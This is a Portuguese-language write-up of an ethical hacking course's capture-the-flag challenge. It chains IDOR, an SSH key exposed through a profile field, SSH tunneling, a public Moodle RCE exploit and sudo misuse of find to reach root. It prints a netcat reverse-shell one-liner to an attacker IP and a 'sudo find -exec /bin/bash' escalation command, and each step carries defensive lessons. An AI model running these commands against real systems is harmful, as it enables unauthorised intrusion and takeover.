# Atlas Company — (Curso de Ethical Hacking)

Write-up do desafio final de um curso de ethical hacking: uma cadeia completa de ataque contra uma aplicação web fictícia, encadeando falhas de aplicação até execução remota de código e root no servidor.

**Técnicas:** Information Disclosure, IDOR, SSH Tunneling, RCE via CVE conhecida, Privilege Escalation

## Cadeia de ataque

```
Information Disclosure (código-fonte)
  → IDOR (perfis de outros usuários)
    → IDOR (chave SSH privada exposta) → acesso SSH
      → SSH Tunneling → RCE em CMS desatualizado
        → Privilege Escalation via sudo mal configurado
```

---

## Reconhecimento

**Camada OSI:** 7 (Aplicação)

```bash
nmap -sV <IP>
```

Três serviços relevantes: SSH, uma aplicação web na porta 80, e uma API de suporte numa porta alternativa (Node.js).

```bash
gobuster dir -u http://<IP> -w <wordlist> -t 50 -x php,txt,html,bak -s 200,302
```

- `dir` — modo de enumeração de diretórios
- `-t 50` — 50 threads paralelas
- `-x` — extensões testadas em cada palavra da wordlist
- `-s 200,302` — filtra apenas essas respostas

A aplicação web redirecionava quase tudo para o login, exceto a própria página de login. A API na porta alternativa expôs um endpoint de status.

---

## Falha 1 — Information Disclosure

**Vetor:** código-fonte HTML da página de login
**Camada OSI:** 7 (Aplicação)

Inspecionando o código-fonte da página de login (`Ctrl+U` ou `view-source:`), havia um comentário HTML deixado por engano, revelando a primeira flag do desafio.

> **Lição:** sempre inspecionar o código-fonte de páginas web antes de qualquer outra coisa. Comentários de desenvolvimento esquecidos em produção são um achado comum e barato.

---

## Falha 2 — IDOR (acesso a outros perfis)

**Vetor:** manipulação do parâmetro de identificação de usuário numa API de perfil
**Camada OSI:** 7 (Aplicação)
**Ferramenta:** Burp Suite

Fluxo do ataque:

1. Login como usuário convidado (sem privilégio).
2. Interceptação da requisição que carrega o próprio perfil com o Burp Suite.
3. Identificação de que o frontend envia um ID numérico de usuário no corpo da requisição.
4. Alteração desse ID, no Burp Repeater, para outros valores menores.
5. Cada ID retornava o perfil de outro usuário — incluindo, num deles, uma informação sensível na descrição do perfil.

> **Lição:** o servidor não validava se o ID pedido pertencia à sessão autenticada — qualquer usuário logado podia ler o perfil de qualquer outro, só trocando um número.

---

## Falha 3 — Chave SSH privada exposta via IDOR

**Vetor:** o mesmo IDOR do passo anterior, aplicado ao perfil de um usuário administrativo
**Camada OSI:** 4 (Transporte) / 7 (Aplicação)

Repetindo a técnica anterior contra o ID do usuário administrador, a descrição do perfil continha uma **chave SSH privada completa**.

```bash
nano id_admin
# colar a chave (-----BEGIN OPENSSH PRIVATE KEY----- ... -----END OPENSSH PRIVATE KEY-----)
chmod 600 id_admin
```

- `chmod 600` — restringe a leitura/escrita da chave só ao dono; o SSH recusa chaves com permissão mais aberta que essa.

```bash
ssh -i id_admin admin@<IP>
```

Acesso obtido diretamente como usuário administrativo da aplicação, via SSH.

> **Lição:** nunca expor segredos (chaves, tokens, senhas) em campos de perfil ou qualquer dado retornado por uma API — mesmo que pareça "escondido" atrás de autenticação, qualquer falha de controle de acesso o expõe.

---

## Falha 4 — Enumeração pós-exploração

Já com acesso SSH como administrador, a enumeração do sistema revelou que esse usuário pertencia a um grupo adicional do sistema, o que permitiu ler arquivos de outro usuário local na máquina — mais uma flag do desafio.

---

## Falha 5 — RCE via CMS desatualizado + Privilege Escalation

**Vetor:** CVE pública contra uma instalação desatualizada de um CMS educacional (Moodle), seguida de `sudo` mal configurado
**Camada OSI:** 7 (Aplicação)

### Descoberta de serviço interno

```bash
ss -tlnp
```

Revelou o CMS e um banco de dados rodando apenas em `localhost`, não acessíveis de fora.

### Túnel SSH

```bash
ssh -i id_admin -L <porta_local>:127.0.0.1:<porta_remota> admin@<IP> -N
```

- `-L` — redireciona uma porta local para uma porta interna do servidor
- `-N` — não executa comando remoto, só mantém o túnel aberto

Com o túnel, o CMS interno ficou acessível pelo navegador local.

### Coleta de credenciais

Arquivos de configuração da aplicação e consultas diretas ao banco de dados local da API (SQLite) revelaram credenciais de acesso ao CMS e a um usuário administrativo da aplicação principal.

### Exploração da CVE

```bash
searchsploit <cms> <versao>
searchsploit -m <caminho_do_exploit>
```

Um exploit público para a versão do CMS permitiu execução remota de comando, usando as credenciais coletadas:

```bash
python3 exploit.py \
  --url http://127.0.0.1:<porta_local> \
  --username <usuario> \
  --password <senha> \
  --courseid <id> \
  --cmid <id> \
  --cmd "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <meu_IP> <porta> >/tmp/f"
```

- `mkfifo` — cria um pipe nomeado, usado aqui para montar uma reverse shell interativa a partir de um RCE que só executava um comando por vez.

### Escalada de privilégio

```bash
sudo -l
```

Revelou que o usuário comprometido podia rodar um utilitário comum (`find`) como root, sem senha. Esse binário tem uma opção de execução (`-exec`) que permite rodar qualquer comando:

```bash
sudo /usr/bin/find /var/log/ -exec /bin/bash \; -quit
```

- `-exec /bin/bash \;` — executa um shell para cada resultado encontrado
- `-quit` — para após o primeiro, abrindo só um shell

Resultado: shell como root, e a flag final do desafio.

> **Lição:** nunca conceder `sudo` para binários como `find`, `vim`, `python`, `awk` ou `perl` — todos têm formas internas de abrir um shell ou executar comandos arbitrários. O GTFOBins é a referência para checar isso.

---

## Conceitos-chave

- **IDOR (Insecure Direct Object Reference)** — acessar dados de outro usuário só trocando um identificador numa requisição, por falta de verificação de permissão no servidor.
- **SSH Tunneling** — redirecionar uma porta local para um serviço que só existe internamente no servidor remoto, usando o próprio SSH como "ponte".
- **Privilege Escalation via `sudo` mal configurado** — quando um binário com funcionalidades internas de execução (`-exec`, modo interativo) recebe permissão `sudo`, ele vira um caminho direto para virar root.

## Lições aprendidas

- Uma cadeia de ataque raramente depende de uma falha só: aqui, um simples IDOR levou, em sequência, a um acesso SSH completo e depois a root.
- Validar permissão de acesso por objeto (não só autenticação) é essencial — a aplicação sabia quem o usuário era, mas não verificava se ele podia ver aquele dado específico.
- Manter software (CMS, frameworks) atualizado reduz drasticamente a superfície de ataque contra CVEs públicas e já documentadas.
